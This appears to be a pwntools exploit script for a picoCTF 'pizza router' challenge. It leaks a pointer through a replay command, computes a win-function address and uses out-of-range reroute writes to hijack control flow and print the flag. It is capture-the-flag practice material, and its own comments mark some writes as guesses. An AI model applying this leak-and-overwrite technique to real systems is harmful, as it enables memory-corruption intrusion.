#!/usr/bin/env python3
"""Quick pizza router attempt — one shot, no brute force."""
from pwn import *
import sys, io, re, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
context.log_level = "error"

HOST = "mysterious-sea.picoctf.net"
PORT = 64586
G = 16

r = remote(HOST, PORT, timeout=5)
r.recv(timeout=2)

# Setup order
r.sendline(b"load city1.map"); time.sleep(0.5); r.recv(timeout=1)
r.sendline(b"add_order 5 5"); time.sleep(1); r.recv(timeout=1)

# Leak
r.sendline(b"replay 0"); time.sleep(1)
rep = r.recv(timeout=3).decode(errors="replace")
# May need to recv more
try:
    rep += r.recv(timeout=1).decode(errors="replace")
except:
    pass
m = re.search(r"renderer=(0x[0-9a-f]+)", rep)
if not m:
    print(f"REPLAY RAW: {repr(rep)}")
    sys.exit(1)
renderer = int(m.group(1), 16)
win = renderer + 0x200
win_low = win & 0xFFFFFFFF
win_high = (win >> 32) & 0xFFFFFFFF
print(f"win = {hex(win)}, low={hex(win_low)}, high={hex(win_high)}")

# win_high is the UPPER 4 bytes of PIE addr - should be small (~0x55=85)
# We need x + y*16 = win_high.  For win_high=0x55=85: y=5, x=5
y1 = win_high // G
x1 = win_high % G
print(f"Order 1 coords: ({x1}, {y1}) -> flat_idx={win_high}")

# Add order 1
r.sendline(f"add_order {x1} {y1}".encode()); time.sleep(1)
out = r.recv(timeout=2).decode(errors="replace")
try:
    out += r.recv(timeout=1).decode(errors="replace")
except:
    pass
print(f"Add order 1: {out.strip()}")

# win_low as signed 32-bit for reroute
win_low_s = win_low - 0x100000000 if win_low > 0x7FFFFFFF else win_low

# Set entries[0].cost = win_low, entries[1].cost = win_low
# entries[1].flat_idx and entries[2].flat_idx = win_high (auto)
r.sendline(f"reroute 1 0 {win_low_s}".encode()); time.sleep(0.3); r.recv(timeout=1)
r.sendline(f"reroute 1 1 {win_low_s}".encode()); time.sleep(0.3); r.recv(timeout=1)

# Also try setting the upper 4B of fx[0x10] (entries[131].cost) to win_high
# (lower 4B stays as original path_data+0x420, which is wrong, but try)
r.sendline(f"reroute 1 131 {win_high}".encode()); time.sleep(0.3); r.recv(timeout=1)
r.sendline(f"reroute 1 132 {win_high}".encode()); time.sleep(0.3); r.recv(timeout=1)

# Dispatch order 1
r.sendline(b"dispatch 1")
time.sleep(4)
try:
    out = r.recv(timeout=5).decode(errors="replace")
    try:
        out += r.recv(timeout=2).decode(errors="replace")
    except:
        pass
    print(f"Dispatch output:\n{out}")
    m = re.search(r"picoCTF\{[^}]+\}", out)
    if m:
        print(f"\n=== FLAG: {m.group(0)} ===")
except Exception as e:
    print(f"Error: {e}")
r.close()
